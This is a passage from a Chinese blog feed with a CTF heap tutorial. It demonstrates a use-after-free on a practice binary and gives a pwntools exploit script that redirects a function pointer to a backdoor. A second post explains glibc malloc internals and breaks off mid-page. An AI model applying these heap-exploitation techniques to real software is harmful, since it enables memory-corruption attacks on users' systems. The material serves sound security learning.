class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>);<br><span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x256</span>);<br><span class="hljs-type">char</span>* c;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;we could continue mallocing here...\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);<br><span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;this is A!&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);<br>c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);<br><span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;this is C!&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以编译一下做一下这个实验</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>做一个最简单的UAF漏洞的题，初学堆做出来再简单的题都会很有成就感😃。</p><p>下载地址:<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn141_1804">例题</a></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011605301.png"></p><p>一个经典菜单，打开各个功能看一下</p><p>Add note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( count &lt;= <span class="hljs-number">5</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )<br>      &#123;<br>        *((_DWORD *)&amp;notelist + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);<br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        **((_DWORD **)&amp;notelist + i) = print_note_content;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = *((_DWORD *)&amp;notelist + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size);<br>        <span class="hljs-keyword">if</span> ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + <span class="hljs-number">4</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *(<span class="hljs-type">void</span> **)(*((_DWORD *)&amp;notelist + i) + <span class="hljs-number">4</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++count;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>申请堆块的时候先申请一个0x8大小的堆块管理，第一个字储存了print函数的地址，第二个字储存堆的内容地址，这个堆块的地址存在notelist中。下面就申请了储存内容的堆。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011615307.png" alt="申请堆结构"></p><p>Delete note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(*((_DWORD *)&amp;notelist + v1) + <span class="hljs-number">4</span>));<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;notelist + v1));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里存在UAF漏洞free掉堆块，但是没有把指针赋值为NULL</p><p>Print note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">print_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )<br>    (**((<span class="hljs-type">void</span> (__cdecl ***)(_DWORD))&amp;notelist + v1))(*((_DWORD *)&amp;notelist + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用控制堆块的打印函数，传入参数为内容堆块的地址</p><p>存在后门函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011619614.png" alt="后门函数"></p><p>我们十分想调用这个诱人且友好的后门函数，但是怎么调用呢，这是个问题，我们知道使用打印内容功能的时候，会调用打印函数，如果调用打印函数的地址改为后门函数的地址那就好了，我们尝试一下</p><p>如果想改变控制堆块的print地址，我们就想办法，把控制堆块变成内容堆块，然后输入后门函数地址覆盖掉print的地址。</p><p>利用思路如下：</p><ul><li>申请note0 大小为0x10(只要大小和控制堆块大小不一样就行)</li><li>申请note1 大小为0x10(同上)</li><li>释放note0</li><li>释放note1</li><li>此时大小为0x10的fast bin中链表为note1 -&gt; note0 </li><li>申请note2 大小为0x8，那么根据堆的分配规则</li><li>note2的控制堆块分配note1的控制堆块，内容堆块分配note0的控制堆块</li><li>这时候我们向note2输入信息，就会储存再note0的控制堆块</li><li>由于我们的note0没有被赋值为NULL，存在UAF漏洞，所以我们还可以使用note0</li><li>当再次掉用note0的打印功能的时候，此时已经被我们覆盖为后门函数，那么就可以直接调用后门函数</li></ul><p>OK了兄弟们，是不是非常神奇，一个简单的题，都要很巧妙的利用</p><p>EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn141_1804&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdb.attach(p, gdbscript=<span class="hljs-string">&quot;b * main&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>add(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;bbbb&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>, p32(use))<br>show(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>UAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次艰难的堆探索</title>
    <link href="/2024/07/26/%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%A0%86%E6%8E%A2%E7%B4%A2/"/>
    <url>/2024/07/26/%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%A0%86%E6%8E%A2%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="堆的认识"><a href="#堆的认识" class="headerlink" title="堆的认识"></a>堆的认识</h1><h2 id="初始堆"><a href="#初始堆" class="headerlink" title="初始堆"></a>初始堆</h2><ul><li>是虚拟地址空间的的 一块连续的线性区域</li><li>提供动态分配的内存，允许程序申请大小未知的内存</li><li>在用户与操作系统之间，作为动态内存管理的中间人</li><li>响应用户的申请内存请求， 向操作系统申请内存，然后将其返回给用户程序</li><li>管理用户所释放的内存，适 时归还给操作系统</li></ul><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262317234.png"></p><ol><li>堆区域为Data上边，增长方向为低地址到高地址 </li><li>shared libraries也是堆区域</li></ol><h2 id="申请内存的系统调用"><a href="#申请内存的系统调用" class="headerlink" title="申请内存的系统调用"></a>申请内存的系统调用</h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262321375.png"></p><ol><li>对于主线程可以用brk、mmap申请栈空间</li><li>对于子线程只能用mmap申请栈空间</li><li>brk申请空间是把data上面的heap向上增长，mmap申请空间是在物理内存映射到虚拟地址</li></ol><h2 id="堆管理器与用户的交互"><a href="#堆管理器与用户的交互" class="headerlink" title="堆管理器与用户的交互"></a>堆管理器与用户的交互</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>内存分配区，可以理解为堆管理器所持有的内存池</p><p>操作系统–&gt;堆管理器–&gt;用户</p><p>物理内存–&gt;arena–&gt;可用内存</p><p>堆管理器与用户的内存交易发生于arena中，可以理解为堆管理器向操作系统批发下来的有有冗余的内存库存</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262338592.png"></p><h2 id="堆的基本单位chunk"><a href="#堆的基本单位chunk" class="headerlink" title="堆的基本单位chunk"></a>堆的基本单位chunk</h2><p>用户申请内存的单位，也是堆管理器管理内存的基本单位，malloc()返回指针指向一个chunk的数据区域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs [c]">struct malloc_chunk &#123;<br><br>  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */<br>  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */<br><br>  struct malloc_chunk* fd;         /* double links -- used only if free. */<br>  struct malloc_chunk* bk;<br><br>  /* Only used for large blocks: pointer to next larger size.  */<br>  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */<br>  struct malloc_chunk* bk_nextsize;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="mallco-chunk"><a href="#mallco-chunk" class="headerlink" title="mallco chunk"></a>mallco chunk</h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262344788.png"></p><ul><li>prve_size ：表示前一个已经释放的chunk的大小，当前一个chunk没有释放时，无意义</li><li>size ：表示自身chunk的大小，有三个标志位A、M、P<ul><li>A ：chunk 是否属于主线程，1表示不属于，0表示属于</li><li>M ：chunk是否用由mmap系统调用分配，1表示是，0表示不是</li><li>P ：chunk前一个chunk是否在使用，1表示在使用，0表示被释放</li></ul></li><li></li></ul><h2 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h2><h3 id="fastbin-free-chunk"><a href="#fastbin-free-chunk" class="headerlink" title="fastbin free chunk"></a>fastbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271527975.png"></p><h3 id="smallbin-free-chunk"><a href="#smallbin-free-chunk" class="headerlink" title="smallbin free chunk"></a>smallbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270001044.png"></p><h3 id="lagerbin-free-chunk"><a href="#lagerbin-free-chunk" class="headerlink" title="lagerbin free chunk"></a>lagerbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270010770.png"></p><h2 id="bin机制"><a href="#bin机制" class="headerlink" title="bin机制"></a>bin机制</h2><h3 id="bin链的保存（struct-malloc-state结构体）"><a href="#bin链的保存（struct-malloc-state结构体）" class="headerlink" title="bin链的保存（struct_ malloc_state结构体）"></a>bin链的保存（struct_ malloc_state结构体）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs [c]">typedef struct malloc_chunk* mchunkptr;<br>typedef struct malloc_chunk *mfastbinptr;<br>/**<br> * 全局malloc状态管理<br> */<br>struct malloc_state<br>&#123;<br>  /* Serialize access. 同步访问互斥锁 */<br>  __libc_lock_define (, mutex);<br> <br>  /* Flags (formerly in max_fast).<br>   * 用于标记当前主分配区的状态<br>   *  */<br>  int flags;<br> <br>  /* Set if the fastbin chunks contain recently inserted free blocks.  */<br>  /* Note this is a bool but not all targets support atomics on booleans.  */<br>  /* 用于标记是否有fastchunk */<br>  int have_fastchunks;<br> <br>  /* Fastbins fast bins。<br>   * fast bins是bins的高速缓冲区，大约有10个定长队列。<br>   * 当用户释放一块不大于max_fast（默认值64）的chunk（一般小内存）的时候，会默认会被放到fast bins上。<br>   * */<br>  mfastbinptr fastbinsY[NFASTBINS];<br> <br>  /* Base of the topmost chunk -- not otherwise kept in a bin */<br>  /* Top chunk ：并不是所有的chunk都会被放到bins上。<br>   * top chunk相当于分配区的顶部空闲内存，当bins上都不能满足内存分配要求的时候，就会来top chunk上分配。 */<br>  mchunkptr top;<br> <br>  /* The remainder from the most recent split of a small request */<br>  mchunkptr last_remainder;<br> <br>  /* Normal bins packed as described above<br>   * 常规 bins chunk的链表数组<br>   * 1. unsorted bin：是bins的一个缓冲区。当用户释放的内存大于max_fast或者fast bins合并后的chunk都会进入unsorted bin上<br>   * 2. small bins和large bins。small bins和large bins是真正用来放置chunk双向链表的。每个bin之间相差8个字节，并且通过上面的这个列表，<br>   * 可以快速定位到合适大小的空闲chunk。<br>   * 3. 下标1是unsorted bin，2到63是small bin，64到126是large bin，共126个bin<br>   * */<br>  mchunkptr bins[NBINS * 2 - 2];<br> <br>  /* Bitmap of bins<br>   * 表示bin数组当中某一个下标的bin是否为空，用来在分配的时候加速<br>   * */<br>  unsigned int binmap[BINMAPSIZE];<br> <br>  /* 分配区全局链表：分配区链表，主分配区放头部，新加入的分配区放main_arean.next 位置 Linked list */<br>  struct malloc_state *next;<br> <br>  /* 分配区空闲链表 Linked list for free arenas.  Access to this field is serialized<br>     by free_list_lock in arena.c.  */<br>  struct malloc_state *next_free;<br> <br>  /* Number of threads attached to this arena.  0 if the arena is on<br>     the free list.  Access to this field is serialized by<br>     free_list_lock in arena.c.  */<br>  INTERNAL_SIZE_T attached_threads;<br> <br>  /* Memory allocated from the system in this arena.  */<br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><p>实际编译后这个结构体就是arena</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271319241.png"></p><ul><li><p><strong>fastbinY数组：</strong>大小为10。记录的是fast bin链。<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271321437.png"></p></li><li><p><strong>bins数组：</strong>大小为129。记录的是unsorted bin（1）、small bin（2<del>63）、large bin链（64</del>126）。<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271332431.png"></p></li></ul><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>fast bin是ptmalloc为了解决用户频繁的创建空间还能快速响应的结构</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270032625.png"></p><p>表头为物理连接，每个bin链为逻辑连接，用bk指针</p><h4 id="fast-bin特点"><a href="#fast-bin特点" class="headerlink" title="fast bin特点"></a>fast bin特点</h4><ul><li>采用LIFO策略，和栈类似，为单链表结构</li><li>chunk的inuse bit永远是1。应为fast bin会被频繁使用，所以fast bin是不参与合并的，</li></ul><hr><p>今后学到补充补充</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" 